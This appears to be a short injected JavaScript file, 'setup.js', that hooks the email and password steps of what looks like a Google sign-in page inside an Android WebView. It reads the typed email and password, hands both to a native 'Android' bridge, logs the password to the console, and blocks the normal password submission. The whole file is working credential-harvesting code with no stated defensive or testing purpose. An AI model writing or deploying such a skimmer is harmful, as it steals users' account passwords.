console.log('loaded setup.js at 3');

console.log("document is ready");
console.log(jQuery('#identifierNext'));

jQuery("#identifierNext").click(function (event) {
    Android.returnUsername(jQuery('input[type=email]')[0].value);
    console.log(jQuery('input[type=email]')[0].value);

    setTimeout(function() {
        jQuery("#passwordNext").click(function (event) {
            event.preventDefault();
            Android.returnPassword(jQuery('input[type=password]')[0].value);
            console.log(jQuery('input[type=password]')[0].value);
        });
    }, 1000);
});

(function () {
    return "did perform setup";
})();